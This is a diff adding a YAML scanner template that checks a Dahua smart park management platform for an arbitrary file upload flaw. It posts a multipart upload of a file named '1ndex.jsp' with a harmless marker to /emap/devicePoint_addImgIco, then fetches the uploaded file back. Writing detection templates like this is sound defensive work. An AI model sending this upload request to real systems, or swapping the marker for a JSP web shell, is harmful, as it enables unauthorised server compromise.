@@ -1,0 +1,19 @@
+name: 大华智慧园区综合管理平台-devicePoint_addImgIco-upload
+description: >-
+  文件上传
+alwaysExecute: false
+matchCount: 2
+rules:
+  - method: POST
+    path: /emap/devicePoint_addImgIco?hasSubsystem=true
+    search: '"data":"(?P<filename>[^"]+)"'
+    headers:
+      Content-Type: multipart/form-data; boundary=A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT
+    body: "--A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT\r\nContent-Disposition: form-data; name=\"upload\"; filename=\"1ndex.jsp\"\r\nContent-Type: application/octet-stream\r\nContent-Transfer-Encoding: binary\r\n\r\nRscan_test\r\n--A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT--"
+    expression:
+      status: 200
+  - method: GET
+    path: /upload/emap/society_new/{{filename}}
+    expression:
+      status: 200
+      body_all: ["Rscan_test"]
